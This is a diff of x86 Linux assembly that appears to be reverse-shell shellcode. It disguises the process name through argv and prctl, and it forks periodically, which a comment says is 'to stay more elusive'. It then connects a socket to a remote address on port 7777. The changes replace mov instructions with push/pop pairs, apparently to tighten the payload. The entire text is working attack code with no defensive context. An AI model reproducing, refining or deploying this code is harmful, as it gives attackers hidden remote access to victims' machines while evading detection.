@@ -44,14 +44,17 @@ _name:
     ; strncpy(&argv[0], NEW_ARGV, strlen(argv[0] + 1))
     mov edi, [esp]
     mov esi, NEW_ARGV
-    mov ecx, _start - NEW_ARGV ; strlen(NEW_ARGV) + NULL-byte
+    push _start - NEW_ARGV ; strlen(NEW_ARGV) + NULL-byte
+    pop ecx
     _name_loop:
         movsb     ; edi[i] = esi[i] ; i+=1
         loop    _name_loop
         
     ; prctl(PR_SET_NAME, NEW_ARGV)
-    mov eax, NR_PRCTL
-    mov ebx, PR_SET_NAME
+    push PR_SET_NAME
+    push NR_PRCTL
+    pop eax
+    pop ebx
     mov ecx, NEW_ARGV
     int 0x80
     
@@ -62,13 +65,15 @@ _name:
 ; is invoked periodically to stay more elusive
 _new_pid:
     ;fork()
-    mov eax, NR_FORK
+    push NR_FORK
+    pop eax
     int 0x80 
     test eax, eax
     jz sleep ; in child
     
     ;in parent
-    mov eax, NR_EXIT
+    push NR_EXIT
+    pop eax
     xor ebx, ebx ; exit_code = 0
     int 0x80 
     
@@ -173,7 +178,8 @@ dup_loop:
 	push ebx			; ebx = socketfd
 connect:
     mov al, 0x66        ; 0x66 = 102 = socketcall()
-    mov ebx, 0x3         ; ebx = 3 = connect()
+    push 3
+    pop ebx             ; ebx = 3 = connect()
     mov ecx, esp        ; save esp into ecx, points to socketfd
     int 0x80            ; eax = connect(socketfd, *addr[2, 7777, IP], 16) = 0 (on success)
     
